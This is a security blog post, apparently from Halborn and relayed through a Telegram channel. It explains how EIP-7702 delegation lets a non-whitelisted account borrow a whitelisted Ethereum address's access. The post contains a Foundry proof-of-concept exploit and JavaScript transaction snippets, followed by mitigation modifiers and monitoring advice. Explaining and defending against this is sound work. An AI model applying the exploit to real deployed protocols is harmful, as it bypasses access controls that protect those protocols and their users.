# 🛡️ EIP-7702: Whitelist Bypass Vulnerability

- **Source URL:** https://www.halborn.com/blog/post/eip-7702-security-considerations
- **Fetched:** 2026-11-16
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/889 (id 889)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
This articles introduces the `EIP 7702: Set Code for EOAs` and demonstrates a new way of bypassing whitelists by deploying a proxy that is callable by any other account.

## Introduction

The `EIP 7702: Set Code for EOAs`, introduced in [Pectra fork](https://www.pectra.info/) of May 21, 2025 allows default adresses to act like smart contracts. This is useful for example if you want to batch transactions in only one call: deploy a smart contract implementation that performs the desired operations, and execute the logic in your wallet’s context (like a proxy and its implementation).

To do so, the EOA owner would sign an authorization that could then be submitted by anyone as part of the new transaction type:

`authorization_list = [[chain_id, address, nonce, y_parity, r, s], ...]`
The authorization is performed this by signing the EIP-7702 object and sending a transaction to the network:

```
import { walletClient } from "./client.js";
 
const accountImplementation = "0x4Cd241E8d1510e30b2076397afc7508Ae59C66c9";
// Signs an EIP-7702 Authorization object.
// You can use recoverAuthorizationAddress to recover the signing address from the signed Authorization object
const authorization = await walletClient.signAuthorization({
    // Address of the contract to delegate to.
	contractAddress: accountImplementation, 
    // By default, it will be assumed that the EIP-7702 Transaction will be executed by another Account.
	executor: "self",
    // chainId and nonce should auto-populate; override if needed
});
 
const hash = await walletClient.sendTransaction({
	authorizationList: [authorization],
	data: "0x",
	to: walletClient.account.address,
});
console.log(`Delegated at tx ${hash}`);
```
And after that you can call the address like you would call a contract:

```
import { zeroAddress } from "viem";
 
import accountAbi from "./abi.js";
import { account, walletClient } from "./client.js";
 
const hash = await walletClient.writeContract({
	abi: accountAbi,
	address: account.address,
	functionName: "executeBatch",
	args: [
		[
			{
				target: zeroAddress,
				value: 1n,
				data: "0x",
			},
			{
				target: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045",
				value: 0n,
				data: "0xdeadbeef",
			},
		],
	],
});
console.log(`Transaction hash ${hash}`);
```
The transaction flow is as follows:

EIP 7702 transaction flow

See that whether Alice or Bobs execute writeContract pointed at Alice’s address, the msg.sender will always be Alice’s address while performing the calls to external contracts.


## Whitelist bypass exploit

Thanks to that new feature, any EOA can delegate his address to a proxy contract that will forward calls on behalf of the EOA address:

Privilege borrowing transaction flow

### Setup

#### Whitelist

Consider the following vulnerable whitelist contract. There is a `restricted` entry point that only whitelisted users could call.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/console.sol";
import "./IWhitelist.sol";
contract Whitelist is IWhitelist {
    mapping(address => bool) public whitelist;
    uint256 public accessCount;
    // Simplified: Anyone can add to whitelist for demo (in real protocols, this is admin/KYC-gated)
    function addToWhitelist(address user) external {
        whitelist[user] = true;
    }
    function restricted() external {
        require(whitelist[msg.sender], "Not whitelisted");
        console.log("msg.sender:", msg.sender);
        accessCount++;
        emit AccessGranted(msg.sender, tx.origin, msg.sender);
    }
}
```
#### Proxy

Alice being a legitimate whitelisted user, she deploys the following proxy to allow anyone with an EIP-7702 authorization to call her address on the `callThis` entry point and access the whitelist.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "./IWhitelist.sol";
contract Proxy {
    // Public entrypoint: Called on delegated EOA; param ensures flexibility
    function callThis(address victimAddr) external {
        IWhitelist(victimAddr).restricted();
    }
}
```
### Exploit

#### Foundry PoC

The test follows the following steps:

1. Alice is whitelisted on `Whitelist`.
2. Alice deploys `Proxy` and signs a reusable delegation (vm.signDelegation).
3. Bob attaches Alice’s delegation and executes a tx that runs `Proxy` at Alice’s address.
4. Because `Proxy` executes in Alice’s delegated EOA context `msg.sender == Alice`, `Whitelist.restricted()` sees a whitelisted `msg.sender` and grants access while Bob pays gas. The exploit succeeds.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/IWhitelist.sol";
import "../src/Whitelist.sol";
import "../src/Proxy.sol";
contract ExploitTest is Test {
    IWhitelist whitelistInterface;
    Whitelist whitelist;        // Vulnerable to EIP-7702 exploit
    Proxy proxy;
    address alice;
    uint256 alicePk = 1;  // Arbitrary private key for Alice (whitelisted user)
    address bob;
    uint256 bobPk = 2;  // Arbitrary private key for Bob (non-whitelisted attacker)
    function setUp() public {
        alice = vm.addr(alicePk);
        bob = vm.addr(bobPk);
        // Log the generated addresses for debugging
        console.log("Alice address:", alice);
        console.log("Bob address:", bob);
        whitelist = new Whitelist();
    }
    // Normal whitelisted access works
    function testWhitelistedAccess() public {
        whitelist.addToWhitelist(alice);
        vm.prank(alice);
        whitelist.restricted();
        assertEq(whitelist.accessCount(), 1);
    }
    // Non-whitelisted access reverts
    function testNonWhitelistedAccessReverts() public {
        vm.prank(bob);
        vm.expectRevert("Not whitelisted");
        whitelist.restricted();
        assertEq(whitelist.accessCount(), 0);
    }
    // Full EIP-7702 privilege borrowing exploit
    function testExploit() public {
        // Step 1: Whitelist Alice's EOA (Alice is the legitimate whitelisted user)
        whitelist.addToWhitelist(alice);
        assertTrue(whitelist.whitelist(alice));
        // Step 2: Alice deploys the proxy contract (trusted parties can use this to borrow her privileges)
        vm.prank(alice);
        proxy = new Proxy();
        // Step 3: Alice signs delegation authorization once (like EIP-712 typed data)
        // This creates a reusable signature: [chain_id, proxy_address, nonce, y_parity, r, s]
        // Alice can share this sig with trusted parties who need to "borrow" her whitelist privileges
        Vm.SignedDelegation memory sd = vm.signDelegation(address(proxy), alicePk);
        // Step 4: Bob (trusted but non-whitelisted party) wants to borrow Alice's privileges
        // He broadcasts his own EIP-7702 tx, attaching Alice's pre-signed delegation authorization
        // The EVM validates Alice's signature and temporarily delegates her EOA to run proxy code
        vm.startBroadcast(bobPk);
        vm.attachDelegation(sd);
        // Step 5: Bob calls callThis() on Alice's delegated address
        // Alice's EOA temporarily executes proxy code, so msg.sender = Alice (whitelisted)
        // Bob pays gas but gets Alice's privileges through the delegation
        Proxy(alice).callThis(address(whitelist));
        vm.stopBroadcast();
        // Step 6: Verify privilege borrowing worked: Restricted function executed under Alice's identity
        assertEq(whitelist.accessCount(), 1);
    }
}
```
Note that the `msg.sender` received by the `Whitelist` would be Alice’s address, while `tx.origin` would be Bob’s.


The transaction flow of the PoC was as follows:

PoC transaction flow

#### Transactions with Javascript SDK

The example above uses foundry, but this is another way of performing the same exploit:

1. Alice signs the authorization: ```
const authorization = await aliceClient.signAuthorization({
    contractAddress: proxyAddress,  // The proxy contract Alice deployed
    executor: 'self'               // Alice's EOA will execute proxy code
});
```
2. Alice shares with Bob the authorization, and Bob constructs his transaction like this: ```
const transactionRequest = {
    // Attach Alice's signed authorization
    authorizationList: [authorization],
    
    // Transaction details
    to: aliceAccount.address,           // Call Alice's address (now delegated)
    data: encodedProxyCall,             // proxy.callThis(whitelistAddr)
};
const txHash = await bobClient.sendTransaction(transactionRequest);
```

### Mitigation

Reject delegated EIP-7702 calls by reverting when `msg.sender` is executing delegation code.

Exploit mitigation

Example modifier to add to whitelist-protected functions:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
error DelegationNotAllowed(); 
/// @dev Reject calls that are executing an EIP-7702 delegation stub at msg.sender.
///      EIP-7702 delegation stub prefix: 0xef 0x01 0x00
modifier noEIP7702Delegation() {
    bytes memory code = msg.sender.code;
    if (code.length >= 3) {
        if (code[0] == bytes1(0xef) && code[1] == bytes1(0x01) && code[2] == bytes1(0x00)) {
            revert DelegationNotAllowed();
        }
    }
    _;
}
```
If your protocol never expects contract-based calls (account abstraction, multisigs, etc) , a stricter `msg.sender == tx.origin` rule can be applied.

```
modifier onlyEOA() {
    require(msg.sender == tx.origin, "EOA only");
    _;
} 
```
## Impact Analysis

The whitelist bypass is not entirely new in terms of threat model, since technically any user could already give access to their wallet by sharing a private key, allowing multiple actors behind the same address.

However, EIP-7702 introduces a stronger and more scalable vector: delegation without private key sharing. This enables compromised or colluding addresses to act as programmable gateways, making abuse easier to operationalize and harder to monitor.

#### Before EIP-7702:

- Compromised whitelisted address → attacker gains that single address's privileges.
- Collusion → Alice could give her wallet access to Bob (or anyone trusted by Alice) so both can perform whitelisted operations.

#### After EIP-7702:

- Compromised whitelisted address → attacker can delegate to arbitrary code, enabling multiple addresses/actors to access the protocol through that single whitelisted entry point.

In your assessment, we recommend the following BVSS guidelines:

- Origin should be specific, as protected by a whitelist.
- Take in consideration the possibility to have multiple actors accessing an entrypoint from the same wallet address.

## Solution for existing whitelist-based protocols

The following can be recommended for already deployed contracts that are affected:

- Upgradeable contracts: Implement checks to detect EIP-7702 delegation.
- Non-upgradeable contracts: Monitor whitelisted addresses for unusual transaction patterns. Establish incident response procedures if abuse is detected.

## Conclusion

The EIP 7702 allows any account to act as a smart contract, which can be called by any other actor on the network. That allows more flexibility in how a wallet handles his transactions, like sending transactions in batch, or with conditional logic, but also introduces new vulnerabilities. The presented exploit demonstrated that it was possible to bypass a whitelist using a proxy that a whitelisted address delegated to using this EIP. Mitigations include the verification that the caller is an EOA only.

Keep in mind this new attack vector, don’t assume EOAs cannot execute code and that they are only one entity, in particular `tx.origin != msg.sender`.

## References

- Official EIP7702 documentation: [Overview](https://eip7702.io/)
- Specification: [EIP-7702: Set Code for EOAs](https://eips.ethereum.org/EIPS/eip-7702)
- Pectra fork: [Pectra Info](https://www.pectra.info/)
